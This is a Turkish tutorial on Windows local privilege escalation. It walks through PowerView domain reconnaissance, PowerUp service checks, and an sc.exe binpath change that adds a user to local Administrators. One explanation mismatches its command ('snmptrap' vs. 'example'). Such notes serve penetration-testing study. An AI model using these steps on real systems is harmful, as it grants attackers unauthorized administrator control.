# YEREL YETKİ YÜKSELTME (LOCAL PRIVILEGE ESCALATION) - DS

Yetki yükseltme, bir saldırganın veya kötü amaçlı bir yazılımın, bir bilgisayar sistemi veya ağ üzerindeki erişim seviyesini artırması anlamına gelir. Yani, başlangıçta kısıtlı yetkilere sahip olan bir kullanıcı veya programın, daha yüksek ayrıcalıklara ulaşmasıdır.

## ADIM | 1: Keşif - PowerView

PowerView, özellikle Active Directory ortamlarında keşif ve yetki yükseltme için tasarlanmış bir PowerShell betik aracıdır. `PowerView_dev.ps1` ise bu aracın bir parçasıdır.

 **Amacı:** Bir saldırganın veya sızma testi yapan bir uzmanın, bir Windows domain'inde kullanıcılar, bilgisayarlar, gruplar, güven ilişkileri, grup ilkeleri (GPO'lar) ve diğer AD nesneleri hakkında ayrıntılı bilgi toplamasını sağlar.

PowerView aracılığı ile AD sisteminde kullanıcılar, sürümler gibi birçok bilgiyi görebiliriz. Bunu kullanmak için sisteme bağlı bir makina da PowerShell girmemiz gerekir;

* `../PowerView_dev.ps1`

Bu komut ile PowerView scriptlerimizi çalıştırma imkanı buluk.

* `Get-NetUser`

Bu komutu çalıştırdığımızda Domain Server daki tüm kullanıcıları görüntüleriz.

 * `Get-NetUser | Select-Object givenname`

Bu komut, sadece **givenname** sütununun çıktısını verir.

* `Get-NetComputer -Verbose`

Sistemdeki makinaları listeler. **-Verbose** parametresi, çıktıyı düzgün bir şekilde almak için kullanılır.

* `Get-NetGroup`

Bu komut, PowerView betik setinin bir parçasıdır ve domaindeki grupları (aynı yetki veya erişim düzeyine sahip olman kullanıcı ve makinalar) hakkında detaylı bilgi edinmenizi sağlar.


---


## ADIM | 2: Yetki Yükseltme - PowerUp

PowerUp, windows sistemlerinde yerel yetki yükseltme fırsatlarını tespit etmek ve potansiyel olarak kötüye kullanmak için tasarlanmış güçlü bir PowerShell betiğidir.

* ```bash
  ../PowerUp.ps1
  ```

Bu komut ile PowerUp scriptlerini çalıştırma imkanı sağlamış oluruz.

* ```
  Get-ModifiableService -Verbose
  ```

Bu komut, PowerUp yetki yükseltme aracının bir parçasıdır ve bir Windows sisteminde düşük ayrıcalıklı bir kullanıcının değiştirebileceği (manipüle edebileceği) servisleri bulmak için kullanılır.

* ```
  Invoke-AllChecks
  ```
  
Bu komut, PowerUp'ın tüm yerleşik yetki yükseltme kontrol mekanizmalarını devreye sokar. Bu kontroller, az önce manuel olarak baktığınız servis zafiyetlerinin yanı sıra, diğer tüm olası yetki yükseltme vektörlerini de kapsar.

* ```
  sc.exe qc <example.exe>
  ```

### ☆ İşte Yetki Yükseltme Burada Yatıyor:

Bu komut, özellikle `example.exe` adlı servisin nasıl yapılandırıldığını ve hangi yollarla çalıştığını anlamak için önemli bir ilk adımdır.

* ```
  sc.exe config <example> binpath="net localgroup administrators example\employee /add
  ```

  Bu komut, sc.exe (Service Control) aracını kullanarak "example" adlı Windows servisinin çalıştırılabilir dosya yolunu (binary path) değiştirmeyi hedefler. Ancak bu seferki değişiklik, sadece bilgi sorgulamakla kalmıyor, doğrudan bir kullanıcı ekleme işlemi gerçekleştiriyor.
  
  * `sc.exe config snmptrap binpath=`: Bu kısım, snmptrap servisinin çalıştırılabilir dosya yolunu değiştirmek için kullanıldığını belirtir.
  * `net localgroup administrators`: Bu komut, yerel "Administrators" grubunu hedefler.
  * `example\employee`: Bu, sisteme yerel yönetici olarak eklenmek istenen kullanıcının adıdır. Buradaki example genellikle bir etki alanı (domain) adını temsil eder.
  * `/add`: Bu argüman, net localgroup komutuna belirtilen kullanıcıyı veya grubu hedef gruba (burada "administrators") eklemesini söyler.
 
Bu komut başarılı olursa belirtilen **Employee** makinası artık admin yetkilerine sahip olacakltır.



